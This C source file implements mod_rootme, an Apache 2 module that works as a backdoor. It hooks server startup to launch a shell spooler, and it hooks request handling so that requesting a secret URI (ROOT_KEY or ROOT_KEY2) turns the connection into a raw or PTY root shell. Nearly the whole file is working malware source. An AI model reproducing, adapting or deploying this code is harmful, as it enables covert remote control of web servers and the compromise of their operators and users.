/*
 *  Copyright (C) 2004  Christophe Devine
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "ap_config.h"

#include "mod_rootme.h"
#include "mrm_server.h"

static int rootme_post_config(apr_pool_t *pconf, apr_pool_t *plog,
                               apr_pool_t *ptemp, server_rec *s)
{
    shell_spooler();

    return OK;
}

static int rootme_post_read_request(request_rec *r)
{
    int           fd;
    apr_socket_t *client_socket;
    extern module core_module;

    client_socket = ap_get_module_config(
        r->connection->conn_config, &core_module);

    if (client_socket)
        fd = client_socket->socketdes;

    if (!strcmp(r->uri, ROOT_KEY))
    {
        process_client(GET_RAW_SHELL, fd);
        exit(0);
    }

    if (!strcmp( r->uri, ROOT_KEY2))
    {
        process_client(GET_PTY_SHELL, fd);
        exit(0);
    }

    return DECLINED;
}

static void rootme_register_hooks(apr_pool_t *p)
{
    ap_hook_post_config((void *) rootme_post_config,
                        NULL, NULL, APR_HOOK_FIRST);
    
    ap_hook_post_read_request((void *) rootme_post_read_request,
                              NULL, NULL, APR_HOOK_FIRST);
}


/* Dispatch list for API hooks */
module AP_MODULE_DECLARE_DATA rootme_module = {
    STANDARD20_MODULE_STUFF, 
    NULL,                  /* create per-dir    config structures */
    NULL,                  /* merge  per-dir    config structures */
    NULL,                  /* create per-server config structures */
    NULL,                  /* merge  per-server config structures */
    NULL,                  /* table of config file commands       */
    rootme_register_hooks  /* register hooks                      */
};

